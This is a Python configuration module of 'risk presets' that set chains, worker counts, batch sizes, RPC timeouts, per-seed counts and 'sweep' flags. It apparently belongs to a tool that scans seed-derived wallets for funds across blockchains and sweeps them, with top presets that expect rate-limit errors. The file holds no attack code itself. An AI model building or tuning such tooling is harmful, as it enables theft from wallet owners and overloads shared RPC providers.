"""Risk presets. Thresholds are divisors on config.yaml's own min_native."""
from __future__ import annotations

from dataclasses import asdict, dataclass

MAX_BATCH = 400


@dataclass(frozen=True)
class Profile:
    name: str
    chains: tuple
    native_only: bool
    threshold_div: int
    workers: int
    farm_processes: int
    batch: int
    rpc_timeout: float
    max_retries: int
    jitter_ms: int
    deep_funded: bool
    per_seed: int
    sweep: bool
    prefetch: int
    note: str


PRESETS = {
    "safe": Profile("safe", ("ethereum", "bsc", "solana"), True, 1, 12, 2, 25, 18.0,
                    4, 40, False, 10, False, 8,
                    "low load, repo thresholds, native only"),
    "aggressive": Profile("aggressive", ("ethereum", "bsc", "polygon", "base", "solana"),
                          False, 2, 48, 4, 80, 14.0, 4, 25, False, 10, True, 16,
                          "5 chains, tokens on funded, half thresholds"),
    "brutal": Profile("brutal", ("ethereum", "bsc", "polygon", "base", "arbitrum",
                                 "optimism", "avalanche", "solana"),
                      False, 4, 160, 8, 200, 10.0, 3, 10, True, 12, True, 32,
                      "all 8 chains, deep funded scan, quarter thresholds, sweeps"),
    "insane": Profile("insane", ("ethereum", "bsc", "polygon", "base", "arbitrum",
                                 "optimism", "avalanche", "solana"),
                      False, 10, 320, 16, 400, 8.0, 2, 0, True, 16, True, 64,
                      "max throughput, tenth thresholds, expects 429s, sweeps"),
}


def get(name: str) -> Profile:
    try:
        return PRESETS[name]
    except KeyError:
        raise SystemExit(f"unknown profile {name!r}; use {', '.join(PRESETS)}") from None


def dump(profile: Profile) -> dict:
    return asdict(profile)


def load_dict(data: dict) -> Profile:
    data = dict(data)
    data["chains"] = tuple(data.get("chains", ()))
    allowed = Profile.__dataclass_fields__.keys()
    return Profile(**{k: v for k, v in data.items() if k in allowed})